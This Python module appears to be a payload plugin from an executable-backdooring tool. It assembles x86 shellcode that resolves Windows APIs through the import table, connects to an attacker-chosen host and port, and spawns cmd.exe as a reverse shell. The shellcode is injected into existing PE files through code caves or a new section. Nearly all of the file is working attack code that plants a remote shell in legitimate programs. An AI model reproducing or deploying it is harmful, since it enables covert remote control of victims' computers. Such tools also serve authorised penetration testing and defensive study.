import struct
import os
import logging
from core import enum
from core import support

from pe.core import eat_code_caves
from common import common
logger = logging.getLogger(__name__)


class iat_reverse_tcp_inline():

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "iat_reverse_tcp_inline"
        self.description = """Import Address Table reverse tcp shell """
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                             'IDT_IN_CAVE': 'Put new imports in a existing cave',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['add_section',
                                'single_cave',
                                'cave_jumping'
                                ]
        self.shellcode = ""
        self.stackpreserve = b"\x90\x90\x60\x9c"
        self.stackrestore = b"\x9d\x61"
        self.apis_needed = [b'LoadLibraryA', b'GetProcAddress']
        self.payload_type = 'single'

        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()



    def run(self):
        """
        Position dependent shellcode that uses API thunks of LoadLibraryA and
        GetProcAddress to find and load APIs for callback to C2.
        """
        
        #sanity check
        for api in self.apis_needed:
            if api not in self.PM.BDF.pe_object:
                print("APIs not found")
                return False
        

        self.shellcode1 = b"\xfc"   # CLD
        '''
        if self.PM.BDF.pe_object['XP_MODE'] is True:
            self.shellcode1 += ("\x89\xe5"                      # mov ebp, esp
                                "\x31\xd2"                      # xor edx, edx
                                "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
                                "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
                                )
        
        '''
        self.shellcode1 += b"\xbb"           # mov value below to EBX
        '''
        if self.PM.BDF.pe_object['XP_MODE'] is True:
            if self.PM.BDF.pe_object['LoadLibraryA'] - (self.PM.BDF.pe_object['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object['LoadLibraryA'] - (self.PM.BDF.pe_object['ImageBase']) + 1))
            else:
                self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object['LoadLibraryA'] - (self.PM.BDF.pe_object['ImageBase']))
            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
            self.shellcode1 += "\xb9"  # mov value below to ECX
            if self.PM.BDF.pe_object['GetProcAddress'] - (self.PM.BDF.pe_object['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object['GetProcAddress'] - (self.PM.BDF.pe_object['ImageBase']) + 1))
            else:
                self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object['GetProcAddress'] - (self.PM.BDF.pe_object['ImageBase']))
        else:
        '''
        if self.PM.BDF.pe_object[b'LoadLibraryA'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object['LoadLibraryA'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object[b'LoadLibraryA'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']))
        self.shellcode1 += b"\x01\xD3"  # add EBX + EDX
        self.shellcode1 += b"\xb9"  # mov value below to ECX
        if self.PM.BDF.pe_object[b'GetProcAddress'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<I", 0xffffffff + (self.PM.BDF.pe_object['GetProcAddress'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<I", self.PM.BDF.pe_object[b'GetProcAddress'] - (self.PM.BDF.pe_object['AddressOfEntryPoint'] + self.PM.BDF.pe_object['ImageBase']))

        self.shellcode1 += b"\x01\xD1"  # add ECX + EDX

        self.shellcode1 += bytes("\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68"
                            "\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50"
                            "\x97\xFF\x16\x95\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x90\x90\xFF\xD5\x68"
                            "\x74\x41\x00\x00\x68\x6F\x63\x6B\x65\x68\x57\x53\x41\x53\x54\x57"
                            "\xFF\x16\x95\x31\xC0\x50\x50\x50\x50\x40\x50\x40\x50\xFF\xD5\x95"
                            "\x68\x65\x63\x74\x00\x68\x63\x6F\x6E\x6E\x54\x57\xFF\x16\x87\xCD"
                            "\x95\x6A\x05\x68", 'iso-8859-1')
        self.shellcode1 += common.pack_ip_addresses(self.HOST)         # HOST
        self.shellcode1 += b"\x68\x02\x00"
        self.shellcode1 += struct.pack('!H', int(self.PORT))      # PORT
        self.shellcode1 += bytes("\x89\xE2\x6A"
                            "\x10\x52\x51\x87\xF9\xFF\xD5", 'iso-8859-1'
                            )


        if self.MODE.lower() == 'cave_jumping':
            self.shellcode1 += b"\xe9"  # JMP opcode
            #breakupvar is the distance between codecaves
            breakupvar = eat_code_caves.eat_code_caves(self.PM.BDF.pe_object, 0, 1)

            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                                 len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)

        self.shellcode2 = bytes("\x6A\x00\x68\x65\x6C"
                           "\x33\x32\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x73\x41\x00\x00\x68"
                           "\x6F\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x50"
                           "\xFF\x16\x95\x93\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x87\xFE"
                           "\x92\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01"
                           "\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56"
                           "\x56\x53\x56\x87\xDA\xFF\xD5\x89\xE6\x6A\x00\x68\x65\x6C\x33\x32"
                           "\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x65\x63\x74\x00\x68\x65\x4F"
                           "\x62\x6A\x68\x69\x6E\x67\x6C\x68\x46\x6F\x72\x53\x68\x57\x61\x69"
                           "\x74\x54\x50\x95\xFF\x17\x95\x89\xF2\x31\xF6\x4E\x56\x46\x89\xD4"
                           "\xFF\x32\x96\xFF\xD5\x81\xC4\x34\x02\x00\x00", 'iso-8859-1'
                           )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore
